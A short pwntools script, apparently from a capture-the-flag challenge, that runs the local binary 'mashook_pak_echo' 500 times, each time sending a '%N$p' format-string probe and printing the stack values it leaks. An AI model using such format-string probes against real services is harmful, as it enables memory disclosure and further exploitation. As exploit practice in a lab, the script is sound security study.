from pwn import *
elf = ELF('./mashook_pak_echo', checksec=False)
for i in range(1, 501):
    with context.local(log_level = 'error'):
        p = elf.process()
        p.sendlineafter(b'.\n', 'XXAAAACCCC%{0:d}$p'.format(i).encode())
        print(i,p.recvline().strip().decode())
        p.close()